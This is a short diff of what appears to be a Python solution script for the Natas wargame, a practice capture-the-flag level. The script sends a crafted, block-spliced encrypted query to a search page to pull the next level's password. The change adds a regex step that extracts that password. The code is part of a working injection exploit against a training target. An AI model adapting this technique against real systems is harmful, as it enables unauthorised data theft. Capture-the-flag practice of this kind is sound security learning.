@@ -72,8 +72,8 @@ queary = good_base[:int(block_size*3)] + raw_inject[int(block_size*3):int(block_
 b64encoded = (base64.b64encode(queary))
 
 final_queary = (requests.utils.quote(b64encoded).replace('/','%2f'))
-print(final_queary)
+# print(final_queary)
 
 responce = requests.get(url +"/search.php/?query=" + final_queary , auth=(username,password))
-print(responce.text)
+print("password for natas 29 is = "+re.findall("<li>(.*)</li></ul>",responce.text)[0])
 
